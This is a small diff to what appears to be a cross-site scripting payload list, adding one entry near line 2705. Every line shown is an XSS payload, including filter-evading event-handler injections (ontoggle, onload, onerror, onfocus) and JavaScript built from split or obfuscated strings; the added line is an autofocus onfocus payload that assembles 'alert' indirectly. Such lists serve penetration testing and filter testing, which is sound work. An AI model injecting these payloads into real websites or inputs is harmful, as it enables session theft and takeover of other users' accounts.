@@ -2705,4 +2705,5 @@ foo<script>alert(1)</script>
 ">'><details/open/ontoggle​=confirm('XSS')>
 <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
 '-alert?.(1)-'
-<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt```
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt
+"><input autofocus a=\" onfocus​='window[al+/e/[ex+ec]e+rt](1)'>```
